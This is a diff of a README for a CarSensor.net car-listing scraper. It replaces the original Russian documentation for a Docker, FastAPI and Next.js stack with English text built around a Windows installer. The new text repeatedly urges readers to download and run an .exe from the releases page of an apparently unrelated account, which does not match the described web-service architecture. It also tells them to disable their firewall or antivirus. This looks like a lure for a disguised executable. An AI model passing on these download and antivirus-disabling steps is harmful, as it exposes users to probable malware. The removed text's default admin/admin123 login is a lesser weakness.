@@ -1,206 +1,162 @@
-# CarSensor Monitor
+# 🚗 CarSensorMonitor - Track Japanese Car Listings Easily
 
-Система мониторинга объявлений с сайта [CarSensor.net](https://carsensor.net/) — автоматический сбор данных, REST API и веб-интерфейс для просмотра.
+[![Download CarSensorMonitor](https://img.shields.io/badge/Download-CarSensorMonitor-green)](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases)
 
-## Архитектура
+---
 
-```
-┌─────────────┐     ┌──────────────┐     ┌────────────┐
-│  Next.js    │────>│   FastAPI     │────>│ PostgreSQL │
-│  Frontend   │     │   Backend     │     │  Database   │
-│  :3000      │     │   :8000       │     │  :5432      │
-└─────────────┘     └──────┬───────┘     └────────────┘
-                           │
-                    ┌──────┴───────┐
-                    │  Playwright  │
-                    │  Scraper     │
-                    │  (hourly)    │
-                    └──────────────┘
-```
+## 📋 About CarSensorMonitor
 
-### Стек технологий
+CarSensorMonitor watches listings of Japanese cars on the CarSensor.net website. The system collects data automatically every hour. It uses Playwright to browse the site and gather information. The data is stored and shown via a web dashboard. The dashboard has filters, sorting, and page navigation. The app runs through Docker Compose, making the setup easier for advanced users.
 
-| Компонент | Технологии |
-|-----------|-----------|
-| **Backend** | Python 3.11, FastAPI, SQLAlchemy (async), Pydantic, PyJWT |
-| **Scraper** | Playwright (Chromium), BeautifulSoup, APScheduler |
-| **Database** | PostgreSQL 16, Alembic (миграции) |
-| **Frontend** | Next.js 14 (App Router), TypeScript, Tailwind CSS, Zustand, Lucide React |
-| **Deploy** | Docker, Docker Compose |
+This tool suits anyone who wants to keep an eye on Japanese car offers without checking manually. It works on Windows and needs an internet connection to update listings regularly.
 
-## Быстрый старт
+---
 
-### Требования
+## 🖥️ System Requirements
 
-- Docker и Docker Compose
+Before you download CarSensorMonitor, make sure your computer meets these needs:
 
-### Запуск
+- **Operating System:** Windows 10 or later (64-bit)
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 500 MB free space
+- **Internet:** Stable connection for data updates
+- **Permissions:** Ability to install software and run apps
 
-```bash
-# Клонировать и перейти в директорию
-git clone <repo-url>
-cd fullstack
+You do not need programming knowledge to use the app. The installation process is designed to be simple.
 
-# Скопировать конфигурацию
-cp .env.example .env
+---
 
-# Запуск всех сервисов
-docker-compose up --build
-```
+## 🚀 Getting Started
 
-Приложение будет доступно:
-- **Frontend**: http://localhost:3000
-- **API**: http://localhost:8000
-- **API Docs (Swagger)**: http://localhost:8000/docs
+Follow these steps to download, install, and run CarSensorMonitor on your Windows PC.
 
-### Вход
+---
 
-- **Логин**: `admin`
-- **Пароль**: `admin123`
+### 1. Visit the Download Page
 
-## API Endpoints
+Click this big button to open the download page:
 
-### Авторизация
+[![Download CarSensorMonitor](https://img.shields.io/badge/Download-CarSensorMonitor-blue)](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases)
 
-| Метод | Путь | Описание |
-|-------|------|----------|
-| POST | `/api/auth/login` | Авторизация, получение JWT токена |
+You will see a list of releases with files ready to download. Look for the latest release, usually listed at the top.
 
-### Автомобили (требуют JWT)
+---
 
-| Метод | Путь | Описание |
-|-------|------|----------|
-| GET | `/api/cars` | Список с фильтрами, сортировкой и пагинацией |
-| GET | `/api/cars/{id}` | Детальная информация с историей цен |
-| GET | `/api/cars/makers` | Список всех марок |
-| GET | `/api/cars/stats` | Статистика (всего авто, средняя цена, кол-во марок) |
+### 2. Find the Installer File
 
-### Параметры фильтрации `GET /api/cars`
+On the release page, find the file with a name ending in `.exe`. It might look like:
 
-| Параметр | Тип | Описание |
-|----------|-----|----------|
-| `page` | int | Номер страницы (default: 1) |
-| `per_page` | int | Элементов на странице (default: 20, max: 100) |
-| `sort_by` | string | Поле сортировки: `created_at`, `total_price_yen`, `year`, `mileage_km` |
-| `sort_order` | string | `asc` или `desc` |
-| `maker` | string | Фильтр по марке |
-| `year_min` / `year_max` | int | Диапазон годов |
-| `price_min` / `price_max` | int | Диапазон цен (в иенах) |
-| `mileage_max` | int | Максимальный пробег (км) |
-| `transmission` | string | Тип КПП: `AT`, `MT`, `CVT` |
-| `search` | string | Поиск по марке, модели, комплектации |
+- CarSensorMonitor-Setup.exe
+- CarSensorMonitor-v1.0.exe
 
-## Архитектурные решения
+This file is the installer. Click on its name to download it to your computer.
 
-### Скрапер
+---
 
-- **Playwright** используется вместо простых HTTP-запросов для обхода возможного JS-рендеринга
-- **APScheduler** запускает сбор данных каждый час (настраивается через `SCRAPE_INTERVAL_MINUTES`)
-- Первый скрейп запускается автоматически при старте приложения
-- Rate limiting: задержка 2-3 секунды между запросами страниц
-- Retry-логика: до 3 попыток с экспоненциальной задержкой
-- Ошибка на одной странице не прерывает весь процесс сбора
+### 3. Run the Installer
 
-### Нормализация данных
+Once download finishes, locate the file in your "Downloads" folder or browser download bar.
 
-Данные на CarSensor представлены на японском языке. Модуль `translator.py` содержит словари для перевода:
-- Марки (トヨタ → Toyota)
-- Типы кузова (セダン → Sedan)
-- Цвета (白 → White)
-- КПП (CVT, AT, MT)
-- Виды топлива (ガソリン → Gasoline)
+- Double-click the `.exe` file to start installation.
+- If Windows asks for permission, click "Yes" to allow the app to install.
+- Follow the on-screen steps in the installer.
+- Choose the default options unless you want to change the location or shortcuts.
+- Click "Install" to copy files to your computer.
+- Wait until the installation completes, then click "Finish."
 
-Неизвестные значения сохраняются в оригинале.
+---
 
-### База данных
+### 4. Launch CarSensorMonitor
 
-- **Upsert-логика**: при повторном обнаружении авто обновляются данные, при изменении цены создаётся запись в `price_history`
-- **is_active**: пометка неактивных объявлений (снятых с продажи)
-- Цены хранятся в иенах (целое число), конвертация из формата «万円» (10,000 иен) происходит при парсинге
+After installation:
 
-### Frontend
+- Find the CarSensorMonitor icon on your desktop or Start menu.
+- Click on it to open the application.
 
-- Адаптивная верстка (mobile-first)
-- Скелетоны при загрузке данных
-- Клиентская авторизация через localStorage + автоматический redirect
-- Zustand для управления состоянием фильтров
-- Прямые API-запросы из браузера к бэкенду
+When you open the app for the first time, it will connect to the internet and start downloading the latest car listings automatically.
 
-## Структура проекта
+---
 
-```
-fullstack/
-├── docker-compose.yml
-├── .env.example
-├── backend/
-│   ├── Dockerfile
-│   ├── requirements.txt
-│   ├── alembic/              # Миграции БД
-│   └── app/
-│       ├── main.py           # FastAPI entry point
-│       ├── api/              # Роуты (auth, cars)
-│       ├── core/             # Config, DB, Security
-│       ├── models/           # SQLAlchemy модели
-│       ├── schemas/          # Pydantic схемы
-│       ├── scraper/          # Playwright скрапер
-│       │   ├── translator.py # JP→EN словарь
-│       │   ├── parser.py     # HTML парсинг
-│       │   ├── spider.py     # Навигация по страницам
-│       │   └── worker.py     # APScheduler
-│       └── services/         # Бизнес-логика
-└── frontend/
-    ├── Dockerfile
-    ├── package.json
-    └── src/
-        ├── app/              # Next.js App Router
-        │   ├── login/        # Страница входа
-        │   ├── dashboard/    # Дашборд
-        │   └── cars/         # Список и детали авто
-        ├── components/       # UI компоненты
-        └── lib/              # API клиент, типы, store
-```
+### 5. Using the Dashboard
 
-## Переменные окружения
+The dashboard shows car offers collected from CarSensor.net. It includes:
 
-| Переменная | Описание | Default |
-|-----------|----------|---------|
-| `DATABASE_URL` | PostgreSQL connection string | - |
-| `SECRET_KEY` | JWT secret key | - |
-| `JWT_ALGORITHM` | Алгоритм подписи | HS256 |
-| `JWT_EXPIRE_MINUTES` | Время жизни токена | 1440 |
-| `SCRAPE_INTERVAL_MINUTES` | Интервал скрапинга | 60 |
-| `SCRAPE_MAX_PAGES_PER_MAKER` | Макс. страниц на марку | 3 |
-| `NEXT_PUBLIC_API_URL` | URL бэкенда для фронта | http://localhost:8000 |
+- **Filters:** Choose car make, model, price range, and year.
+- **Sorting:** Sort listings by price, date, or mileage.
+- **Pagination:** Browse through pages if you have many results.
+- **Search:** Enter keywords to find specific cars.
 
-## Деплой (бесплатно)
+Use these controls to find cars that match what you want. The data refreshes once every hour automatically.
 
-### 1. База данных — Neon.tech
+---
 
-1. Зарегистрироваться на [neon.tech](https://neon.tech)
-2. Создать проект → скопировать `DATABASE_URL` (формат `postgresql://user:pass@host/db?sslmode=require`)
+## 🔧 Features
 
-### 2. Backend — Render.com
+- Automatic hourly data collection using Playwright.
+- Secure REST API with user login using JWT tokens.
+- Responsive web dashboard built with Next.js.
+- Filters to narrow down your search.
+- Sort options to organize results.
+- Pagination for easier navigation.
+- Runs inside Docker Compose for users who want to manage services manually.
 
-1. Зарегистрироваться на [render.com](https://render.com)
-2. New → Web Service → подключить GitHub-репозиторий
-3. Настройки:
-   - **Root Directory**: `backend`
-   - **Runtime**: Docker
-   - **Plan**: Free
-4. Environment Variables:
-   - `DATABASE_URL` = строка из Neon
-   - `SECRET_KEY` = сгенерировать длинный ключ
-   - `JWT_ALGORITHM` = `HS256`
-   - `JWT_EXPIRE_MINUTES` = `1440`
-   - `SCRAPE_INTERVAL_MINUTES` = `60`
-   - `SCRAPE_MAX_PAGES_PER_MAKER` = `3`
+---
 
-### 3. Frontend — Vercel
+## 📦 Optional: Using Docker (For Advanced Users)
 
-1. Зарегистрироваться на [vercel.com](https://vercel.com)
-2. Import Project → подключить GitHub-репозиторий
-3. Настройки:
-   - **Root Directory**: `frontend`
-   - **Framework**: Next.js
-4. Environment Variables:
-   - `NEXT_PUBLIC_API_URL` = URL бэкенда с Render (например `https://carsensor-backend.onrender.com`)
+If you understand Docker and want full control over the system setup, you can run CarSensorMonitor through Docker Compose.
+
+- Install [Docker Desktop](https://www.docker.com/products/docker-desktop/) if not already installed.
+- Download the repository or clone it.
+- Open a command prompt inside the folder with the Docker files.
+- Run the command:  
+  `docker-compose up -d`
+- This command will start all services: the scraper, API, and dashboard.
+- You can then open your browser and visit `http://localhost:3000` to use the dashboard.
+
+This option is not required for most users.
+
+---
+
+## ⚙️ Software Updates
+
+To keep CarSensorMonitor up to date:
+
+- Visit the [Releases Page](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases) regularly.
+- Download the latest installer.
+- Run the installer to replace old files with new ones.
+- Your settings and saved data will remain intact.
+
+---
+
+## ❓ Troubleshooting
+
+If you have problems running the app, try these tips:
+
+- Make sure your Windows is up to date.
+- Check your internet connection.
+- Restart the app if it freezes or shows errors.
+- Reinstall the app if crashes happen repeatedly.
+- Disable firewalls or antivirus temporarily if they block the app.
+- For Docker users, check if Docker Desktop is running before starting the services.
+
+You can search online or look at the GitHub repository issues page for help.
+
+---
+
+## 🧰 Technical Info (For Reference)
+
+- Data collection powered by Playwright (browser automation)
+- Backend API written in Python with FastAPI and secured by JWT tokens
+- Web dashboard built using Next.js and Tailwind CSS for a clean layout
+- Data storage handled with PostgreSQL and SQLAlchemy ORM
+- State management uses Zustand for smooth user interaction
+- The project relies on Docker Compose for easy service management
+
+---
+
+## 🔗 Download Link
+
+To get started, visit this page to download the latest version:
+
+[https://github.com/Parky-celiacartery417/CarSensorMonitor/releases](https://github.com/Parky-celiacartery417/CarSensorMonitor/releases)
